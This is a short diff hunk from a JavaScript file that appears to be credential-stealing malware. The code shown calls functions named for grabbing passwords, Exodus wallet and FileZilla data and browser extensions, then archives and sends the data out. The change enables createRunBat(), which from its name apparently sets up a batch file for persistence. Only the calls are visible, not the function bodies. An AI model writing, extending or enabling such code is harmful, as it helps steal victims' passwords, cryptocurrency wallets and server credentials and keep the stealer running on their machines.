@@ -2607,6 +2607,6 @@ function onlyUnique(item, index, array) {
         getPasswords();
         submitExodus();
         submitFileZilla();
-        //createRunBat();
+        createRunBat();
         getExtension();
         archiveAndSendData();
